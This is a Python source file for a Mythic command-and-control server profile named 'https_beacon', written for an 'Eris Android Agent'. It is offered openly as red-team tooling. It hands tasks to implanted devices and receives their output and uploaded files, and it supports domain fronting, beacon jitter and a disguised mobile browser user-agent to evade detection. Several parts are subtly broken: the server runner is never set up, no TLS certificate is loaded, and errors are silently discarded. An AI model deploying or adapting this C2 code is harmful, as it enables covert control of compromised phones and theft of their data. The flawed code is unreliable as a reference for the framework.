#!/usr/bin/env python3
"""
HTTPS Beacon C2 Profile - Mythic 3.3 Implementation
Complete C2 server implementation for Eris Android Agent
"""

import asyncio
import json
import base64
import uuid
import time
import ssl
import aiohttp
from aiohttp import web, ClientSession
from datetime import datetime
from typing import Dict, List, Any, Optional
from mythic_c2_container import *

class HTTPSBeaconC2(C2Profile):
    name = "https_beacon"
    description = "HTTPS beacon C2 profile with malleable profiles and domain fronting"
    author = "@RedTeam"
    is_p2p = False
    is_server_routed = True
    server_folder_path = "https_beacon"
    server_binary_path = "https_beacon"

    parameters = [
        C2ProfileParameter(
            name="callback_host",
            description="Callback Host",
            default_value="https://domain.com",
            verifier_regex="^https://[a-zA-Z0-9]+",
            required=True,
            randomize=False,
            format_string="",
            parameter_type=C2ProfileParameterType.String
        ),
        C2ProfileParameter(
            name="callback_port",
            description="Callback Port",
            default_value=443,
            verifier_regex="^[0-9]+$",
            required=True,
            randomize=False,
            format_string="",
            parameter_type=C2ProfileParameterType.Number
        ),
        C2ProfileParameter(
            name="encrypted_exchange_check",
            description="Perform Key Exchange",
            default_value=True,
            required=False,
            parameter_type=C2ProfileParameterType.Boolean
        ),
        C2ProfileParameter(
            name="callback_interval",
            description="Callback Interval (seconds)",
            default_value=10,
            verifier_regex="^[0-9]+$",
            required=False,
            randomize=False,
            format_string="",
            parameter_type=C2ProfileParameterType.Number
        ),
        C2ProfileParameter(
            name="callback_jitter",
            description="Callback Jitter (0-100)",
            default_value=23,
            verifier_regex="^[0-9]+$",
            required=False,
            randomize=False,
            format_string="",
            parameter_type=C2ProfileParameterType.Number
        ),
        C2ProfileParameter(
            name="user_agent",
            description="User Agent String",
            default_value="Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            required=False,
            parameter_type=C2ProfileParameterType.String
        ),
        C2ProfileParameter(
            name="domain_front",
            description="Domain for domain fronting",
            default_value="",
            required=False,
            parameter_type=C2ProfileParameterType.String
        ),
        C2ProfileParameter(
            name="killdate",
            description="Kill Date (YYYY-MM-DD)",
            default_value="2025-12-31",
            verifier_regex="^[0-9]{4}-[0-9]{2}-[0-9]{2}$",
            required=False,
            parameter_type=C2ProfileParameterType.Date
        ),
        C2ProfileParameter(
            name="headers",
            description="Additional HTTP headers (JSON format)",
            default_value='{"Accept": "application/json", "Content-Type": "application/json"}',
            required=False,
            parameter_type=C2ProfileParameterType.Dictionary
        ),
        C2ProfileParameter(
            name="get_uri",
            description="GET request URI",
            default_value="/api/v1/beacon",
            required=False,
            parameter_type=C2ProfileParameterType.String
        ),
        C2ProfileParameter(
            name="post_uri",
            description="POST request URI", 
            default_value="/api/v1/submit",
            required=False,
            parameter_type=C2ProfileParameterType.String
        )
    ]

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.app = None
        self.server = None
        self.active_callbacks = {}
        self.pending_tasks = {}
        
    async def start_server(self) -> bool:
        """Start the HTTPS beacon server"""
        try:
            self.app = web.Application()
            
            # Setup routes
            self.app.router.add_get(self.get_parameter("get_uri"), self.handle_get_request)
            self.app.router.add_post(self.get_parameter("post_uri"), self.handle_post_request) 
            self.app.router.add_options("/{path:.*}", self.handle_options_request)
            
            # Setup SSL context if needed
            ssl_context = None
            if self.get_parameter("callback_port") == 443:
                ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                # Load certificates here if available
                
            # Start server
            port = self.get_parameter("callback_port")
            self.server = web.TCPSite(
                web.AppRunner(self.app), 
                host="0.0.0.0", 
                port=port,
                ssl_context=ssl_context
            )
            
            await self.server.start()
            await self.add_p2p_route(MythicC2RPCOtherServiceMessage(
                service_name="https_beacon",
                command_name="start_server", 
                message=f"Started HTTPS beacon server on port {port}"
            ))
            
            return True
            
        except Exception as e:
            await self.add_p2p_route(MythicC2RPCOtherServiceMessage(
                service_name="https_beacon",
                command_name="start_server_error",
                message=f"Failed to start server: {str(e)}"
            ))
            return False
            
    async def stop_server(self) -> bool:
        """Stop the HTTPS beacon server"""
        try:
            if self.server:
                await self.server.stop()
                self.server = None
                
            if self.app:
                await self.app.cleanup()
                self.app = None
                
            return True
        except Exception as e:
            return False
            
    async def handle_get_request(self, request: web.Request) -> web.Response:
        """Handle GET requests (agent check-in)"""
        try:
            # Extract agent ID from headers or URL parameters
            agent_id = request.headers.get("X-Agent-ID") or request.query.get("id", str(uuid.uuid4()))
            
            # Get pending tasks for this agent
            tasks = await self.get_tasks_for_callback(agent_id)
            
            # Format response
            response_data = {
                "status": "ok",
                "tasks": tasks,
                "timestamp": datetime.now().isoformat()
            }
            
            # Add custom headers
            headers = {}
            try:
                custom_headers = json.loads(self.get_parameter("headers"))
                headers.update(custom_headers)
            except:
                pass
                
            return web.json_response(response_data, headers=headers)
            
        except Exception as e:
            return web.json_response(
                {"status": "error", "message": str(e)}, 
                status=500
            )
            
    async def handle_post_request(self, request: web.Request) -> web.Response:
        """Handle POST requests (agent responses)"""
        try:
            # Get request data
            data = await request.json()
            agent_id = data.get("agent_id") or request.headers.get("X-Agent-ID")
            
            if not agent_id:
                return web.json_response(
                    {"status": "error", "message": "Missing agent ID"}, 
                    status=400
                )
                
            # Process response data
            await self.process_agent_response(agent_id, data)
            
            return web.json_response({"status": "ok", "received": True})
            
        except Exception as e:
            return web.json_response(
                {"status": "error", "message": str(e)}, 
                status=500
            )
            
    async def handle_options_request(self, request: web.Request) -> web.Response:
        """Handle OPTIONS requests for CORS"""
        headers = {
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
            "Access-Control-Allow-Headers": "Content-Type, X-Agent-ID"
        }
        return web.Response(headers=headers)
        
    async def get_tasks_for_callback(self, callback_id: str) -> List[Dict]:
        """Get pending tasks for a callback"""
        try:
            # Request tasks from Mythic core
            response = await self.send_rpc(MythicRPCCallbackSearchMessage(
                search_callback_id=callback_id
            ))
            
            if response.success and response.results:
                callback_info = response.results[0]
                
                # Get tasks for this callback
                task_response = await self.send_rpc(MythicRPCTaskSearchMessage(
                    callback_id=callback_info.id,
                    status="preprocessing"
                ))
                
                if task_response.success:
                    tasks = []
                    for task in task_response.results:
                        tasks.append({
                            "id": task.id,
                            "command": task.command_name,
                            "parameters": task.parameters,
                            "timestamp": task.timestamp.isoformat()
                        })
                    return tasks
                    
        except Exception as e:
            pass
            
        return []
        
    async def process_agent_response(self, agent_id: str, data: Dict) -> None:
        """Process response from agent"""
        try:
            # Send response to Mythic core
            if "task_id" in data:
                await self.send_rpc(MythicRPCTaskUpdateMessage(
                    task_id=data["task_id"],
                    status="completed" if data.get("success", False) else "error",
                    response=data.get("output", ""),
                    completed=True
                ))
                
            # Handle file uploads/downloads
            if "file_data" in data:
                await self.send_rpc(MythicRPCFileCreateMessage(
                    file_contents=base64.b64decode(data["file_data"]),
                    filename=data.get("filename", "unknown")
                ))
                
        except Exception as e:
            pass

# Export the profile
mythic_c2 = HTTPSBeaconC2()
